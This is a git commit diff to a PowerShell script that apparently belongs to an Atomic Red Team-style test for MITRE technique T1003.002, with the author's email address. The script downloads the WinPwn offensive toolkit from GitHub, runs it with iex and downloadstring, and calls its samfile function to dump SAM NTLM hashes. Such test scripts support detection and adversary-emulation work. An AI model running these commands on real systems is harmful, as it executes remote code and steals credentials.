b7f10a236c39d8c0ee780884e6e92d4a2baf0305
keith.salandanan <keith.salandanan@oqulo.com>
2022-09-27 15:16:09 +0800

    Edited T1003.002

--- Credential Access/T1003.002.ps1
+++ Credential Access/T1003.002.ps1
@@ -1,5 +1,6 @@
 #Atomic Test #7 - WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes
 
 $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 samfile -consoleoutput -noninteractive
